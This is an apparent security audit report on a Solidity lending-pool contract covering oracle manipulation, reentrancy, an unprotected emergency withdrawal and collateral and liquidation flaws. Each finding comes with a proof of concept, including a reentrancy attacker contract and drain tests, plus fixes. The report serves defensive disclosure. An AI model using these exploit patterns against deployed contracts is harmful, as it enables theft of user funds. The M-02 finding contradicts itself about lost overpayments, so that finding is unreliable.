# Security Audit Report

## Overview

**Project**: LendingPool  
**Auditor**: Security Audit  
**Date**: January 13, 2026  
**Solidity Version**: ^0.8.24

## Summary

| Severity | Count |
|----------|-------|
| Critical | 3 |
| Medium | 2 |
| Low | 0 |
| Informational | 0 |

**Total Vulnerabilities Found: 5**

---

## Findings

---

### [C-01] Missing Access Control on Price Oracle

**Severity**: Critical  
**Status**: Open

#### Description

The `updatePrice()` function has no access control, allowing any user to set an arbitrary ETH price. This enables price manipulation attacks that can:
1. Set price to 0 to liquidate healthy positions
2. Set price extremely high to borrow more than collateral allows
3. Manipulate liquidations for profit

#### Impact

Complete protocol insolvency. An attacker can drain all funds by manipulating the price oracle.

#### Location

```
src/LendingPool.sol#L39-43
```

```solidity
function updatePrice(uint256 _price) external {
    // Anyone can call this and manipulate the price!
    ethPrice = _price;
    emit PriceUpdated(_price);
}
```

#### Proof of Concept

```solidity
function test_Exploit_PriceManipulation() public {
    // Victim deposits 10 ETH as collateral
    vm.prank(victim);
    pool.deposit{value: 10 ether}();
    
    // Attacker manipulates price to 0
    vm.prank(attacker);
    pool.updatePrice(0);
    
    // Now victim's position appears undercollateralized
    // Attacker can liquidate for free and steal collateral
}
```

#### Recommendation

Add access control to restrict price updates to the oracle address:

```solidity
function updatePrice(uint256 _price) external {
    require(msg.sender == oracle, "Only oracle can update price");
    require(_price > 0, "Price must be > 0");
    ethPrice = _price;
    emit PriceUpdated(_price);
}
```

---

### [C-02] Reentrancy Vulnerability in withdraw()

**Severity**: Critical  
**Status**: Open

#### Description

The `withdraw()` function violates the Checks-Effects-Interactions (CEI) pattern by making an external call to `msg.sender` before updating state variables. An attacker can recursively call `withdraw()` through a malicious contract's `receive()` function to drain funds.

#### Impact

Complete drainage of contract funds. Attacker can withdraw their deposit multiple times before state is updated.

#### Location

```
src/LendingPool.sol#L56-68
```

```solidity
function withdraw(uint256 amount) external {
    require(deposits[msg.sender] >= amount, "Insufficient deposits");
    require(isHealthy(msg.sender, amount), "Would be undercollateralized");
    
    // External call before state update - VULNERABLE!
    (bool success, ) = msg.sender.call{value: amount}("");
    require(success, "Transfer failed");
    
    // State updates happen AFTER the external call
    deposits[msg.sender] -= amount;
    collateral[msg.sender] -= amount;
    totalDeposits -= amount;
    
    emit Withdraw(msg.sender, amount);
}
```

#### Proof of Concept

```solidity
contract Attacker {
    LendingPool public pool;
    uint256 public attackCount;
    
    constructor(address _pool) {
        pool = LendingPool(payable(_pool));
    }
    
    function attack() external payable {
        pool.deposit{value: msg.value}();
        pool.withdraw(msg.value);
    }
    
    receive() external payable {
        if (attackCount < 5 && address(pool).balance >= 1 ether) {
            attackCount++;
            pool.withdraw(1 ether);
        }
    }
}
```

#### Recommendation

Apply the Checks-Effects-Interactions pattern - update state before external calls:

```solidity
function withdraw(uint256 amount) external {
    require(deposits[msg.sender] >= amount, "Insufficient deposits");
    require(isHealthy(msg.sender, amount), "Would be undercollateralized");
    
    // Update state FIRST
    deposits[msg.sender] -= amount;
    collateral[msg.sender] -= amount;
    totalDeposits -= amount;
    
    // External call LAST
    (bool success, ) = msg.sender.call{value: amount}("");
    require(success, "Transfer failed");
    
    emit Withdraw(msg.sender, amount);
}
```

Alternatively, use a reentrancy guard (nonReentrant modifier).

---

### [C-03] Missing Access Control on emergencyWithdraw()

**Severity**: Critical  
**Status**: Open

#### Description

The `emergencyWithdraw()` function has no access control whatsoever. Anyone can call this function and drain the entire contract balance.

#### Impact

Complete loss of all protocol funds. Single transaction attack requiring zero setup.

#### Location

```
src/LendingPool.sol#L148-152
```

```solidity
function emergencyWithdraw() external {
    // ⚠️ No access control!
    (bool success, ) = msg.sender.call{value: address(this).balance}("");
    require(success, "Transfer failed");
}
```

#### Proof of Concept

```solidity
function test_Exploit_EmergencyWithdraw() public {
    // Pool has 50 ether from setup
    uint256 poolBalanceBefore = address(pool).balance;
    uint256 attackerBalanceBefore = attacker.balance;
    
    // Attacker simply calls emergencyWithdraw
    vm.prank(attacker);
    pool.emergencyWithdraw();
    
    // Attacker drains entire pool
    assertEq(address(pool).balance, 0);
    assertEq(attacker.balance, attackerBalanceBefore + poolBalanceBefore);
}
```

#### Recommendation

Add owner access control:

```solidity
address public owner;

constructor(address _oracle) {
    oracle = _oracle;
    owner = msg.sender;
    ethPrice = 2000 * 1e18;
}

function emergencyWithdraw() external {
    require(msg.sender == owner, "Only owner");
    (bool success, ) = msg.sender.call{value: address(this).balance}("");
    require(success, "Transfer failed");
}
```

---

### [M-01] Wrong Collateral Ratio Check in borrow()

**Severity**: Medium  
**Status**: Open

#### Description

The `borrow()` function checks if `collateralValue >= newBorrowValue` but doesn't enforce the 150% collateral ratio defined in `COLLATERAL_RATIO`. This allows users to borrow up to 100% of their collateral value instead of the intended ~66% (100/150).

#### Impact

Protocol becomes undercollateralized. Users can borrow more than they should, leading to bad debt when prices move against them.

#### Location

```
src/LendingPool.sol#L79
```

```solidity
// BUG: This only checks 1:1 ratio, not 150%!
require(collateralValue >= newBorrowValue, "Insufficient collateral");
```

#### Proof of Concept

```solidity
function test_Exploit_CollateralCalculation() public {
    // User deposits 10 ETH
    vm.startPrank(victim);
    pool.deposit{value: 10 ether}();
    
    // With 150% ratio, max borrow should be ~6.66 ETH
    // But user can borrow full 10 ETH!
    pool.borrow(10 ether);
    
    // Position is immediately undercollateralized if price drops at all
    vm.stopPrank();
}
```

#### Recommendation

Enforce the collateral ratio:

```solidity
function borrow(uint256 amount) external {
    require(amount > 0, "Amount must be > 0");
    
    uint256 collateralValue = (collateral[msg.sender] * ethPrice) / 1e18;
    uint256 newBorrowValue = ((borrows[msg.sender] + amount) * ethPrice) / 1e18;
    
    // Enforce 150% collateralization
    require(
        collateralValue * 100 >= newBorrowValue * COLLATERAL_RATIO,
        "Insufficient collateral"
    );
    
    borrows[msg.sender] += amount;
    totalBorrows += amount;
    
    (bool success, ) = msg.sender.call{value: amount}("");
    require(success, "Transfer failed");
    
    emit Borrow(msg.sender, amount);
}
```

---

### [M-02] Repay Underflow and Flawed Liquidation Bonus

**Severity**: Medium  
**Status**: Open

#### Description

Two related issues:

1. **Repay Underflow**: The `repay()` function doesn't check if `msg.value > borrows[msg.sender]`. While Solidity 0.8+ prevents underflow with a revert, users who overpay lose their excess funds.

2. **Flawed Liquidation Bonus**: The liquidation reward is calculated as `collateral + (collateral * 10%)`, which equals 110% of collateral. This can exceed the contract's available balance and creates unfair liquidation economics.

#### Impact

1. Users can lose funds by accidentally overpaying their debt
2. Liquidations may fail or drain excessive funds from the protocol

#### Location

```
src/LendingPool.sol#L95 (repay)
src/LendingPool.sol#L110-111 (liquidation)
```

```solidity
// repay() - no check for overpayment
borrows[msg.sender] -= msg.value;  // Will revert on underflow, but excess is lost

// liquidate() - reward can exceed balance
uint256 bonus = (collateral[user] * LIQUIDATION_BONUS) / 100;
uint256 reward = collateral[user] + bonus; // 110% of collateral!
```

#### Proof of Concept

```solidity
function test_Exploit_RepayUnderflow() public {
    vm.startPrank(victim);
    pool.deposit{value: 10 ether}();
    pool.borrow(5 ether);
    
    // Try to repay more than owed - will revert in 0.8+
    // But if it didn't, the excess would be lost
    vm.expectRevert();
    pool.repay{value: 10 ether}();
    vm.stopPrank();
}

function test_Exploit_LiquidationBonus() public {
    // Setup: victim has position that can be liquidated
    vm.prank(victim);
    pool.deposit{value: 10 ether}();
    
    vm.prank(victim);
    pool.borrow(8 ether);
    
    // Manipulate price to make position unhealthy
    pool.updatePrice(1000 * 1e18);
    
    // Liquidator tries to liquidate
    // Reward = 10 ETH + 1 ETH bonus = 11 ETH
    // But contract may not have 11 ETH available!
}
```

#### Recommendation

```solidity
// Fixed repay()
function repay() external payable {
    require(msg.value > 0, "Amount must be > 0");
    
    uint256 debt = borrows[msg.sender];
    uint256 payment = msg.value > debt ? debt : msg.value;
    uint256 refund = msg.value - payment;
    
    borrows[msg.sender] -= payment;
    totalBorrows -= payment;
    
    // Refund excess payment
    if (refund > 0) {
        (bool success, ) = msg.sender.call{value: refund}("");
        require(success, "Refund failed");
    }
    
    emit Repay(msg.sender, payment);
}

// Fixed liquidate() - bonus from debt, not collateral
function liquidate(address user) external payable {
    require(!isHealthy(user, 0), "Position is healthy");
    
    uint256 debt = borrows[user];
    uint256 userCollateral = collateral[user];
    require(msg.value >= debt, "Must repay full debt");
    
    // Bonus is 10% of debt value, capped at available collateral
    uint256 bonus = (debt * LIQUIDATION_BONUS) / 100;
    uint256 reward = debt + bonus;
    if (reward > userCollateral) {
        reward = userCollateral;
    }
    
    // Refund excess payment
    uint256 refund = msg.value - debt;
    
    // Clear user's position
    borrows[user] = 0;
    uint256 remainingCollateral = userCollateral - reward;
    collateral[user] = remainingCollateral;
    deposits[user] = remainingCollateral;
    totalBorrows -= debt;
    
    // Transfer reward to liquidator
    (bool success, ) = msg.sender.call{value: reward}("");
    require(success, "Transfer failed");
    
    // Refund excess
    if (refund > 0) {
        (bool refundSuccess, ) = msg.sender.call{value: refund}("");
        require(refundSuccess, "Refund failed");
    }
    
    emit Liquidate(msg.sender, user, debt);
}
```

---

## Conclusion

The LendingPool contract contains **3 Critical** and **2 Medium** severity vulnerabilities that, if exploited, could result in complete loss of user funds. The most severe issues are:

1. **Anyone can manipulate the price oracle** - enabling liquidation attacks
2. **Reentrancy in withdraw** - enabling fund drainage
3. **Anyone can call emergencyWithdraw** - single-transaction total drain

**Recommendation**: Do not deploy this contract until all issues are fixed and re-audited.
